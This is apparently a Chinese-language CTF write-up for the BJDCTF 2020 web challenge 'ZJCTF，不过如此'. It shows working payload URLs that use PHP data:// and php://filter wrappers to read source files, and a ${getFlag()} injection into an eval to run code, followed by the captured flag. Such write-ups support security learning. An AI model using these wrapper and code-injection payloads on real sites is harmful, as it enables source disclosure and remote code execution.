---
title: "Web 12 [BJDCTF 2020]ZJCTF，不过如此"
published: 2025-01-10
category: CTF
---

![](https://pic.npiter.de/file/1771550796591_20260220092634165.png)

涉及到php

先看题目

![](https://pic.npiter.de/file/1771550809468_20260220092634166.png)

> [!TIP]
>
>
> 需要读取text的内容是否为I have a dream，且file参数里面不能含有flag

#### 构造使用php伪协议进行读取

```
/?text=data://plain/text,I%20have%20a%20dream&file=php://filter/read=convert.base64-encode/resource=next.php

```

得到base64

![](https://pic.npiter.de/file/1771550811150_20260220092634167.png)

进行解码

![](https://pic.npiter.de/file/1771550809125_20260220092634168.png)

#### 发现命令执行漏洞：@eval($_GET[‘cmd’]);

```
/next.php?\S*=${getFlag()}&&cmd=phpinfo();

```

![](https://pic.npiter.de/file/1771550820153_20260220092634169.png)

#### Ctrl+G搜索flag

![](https://pic.npiter.de/file/1771550823995_20260220092634170.png)

**NSSCTF{453a61d6-6601-4a35-bc99-2090d2f0a749}**
